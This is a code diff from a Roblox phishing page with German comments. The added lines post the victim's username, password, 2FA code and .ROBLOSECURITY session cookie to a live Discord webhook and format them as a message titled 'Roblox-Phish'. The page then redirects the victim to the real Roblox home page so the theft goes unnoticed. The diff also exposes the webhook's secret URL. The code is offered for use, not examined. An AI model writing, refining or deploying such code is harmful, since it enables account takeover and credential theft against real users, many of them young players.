@@ -24,11 +24,24 @@ document.getElementById('f').addEventListener('submit', async e => {
   const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
 
   // LIVE-Push zu webhook.site (kein Token nötig)
-  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {   // ← deine URL
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({t: Date.now(), u, p, mfa: m, robloxSec})
-  });
+  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    content: '**Roblox-Phish**',
+    embeds: [{
+      title: 'Neuer Login',
+      color: 0x02b757,
+      fields: [
+        { name: 'Username', value: u, inline: true },
+        { name: 'Password', value: p, inline: true },
+        { name: '2FA', value: m || '–', inline: true },
+        { name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  })
+});
 
   // Weiterleitung zum echten Roblox
   window.location = 'https://www.roblox.com/home';
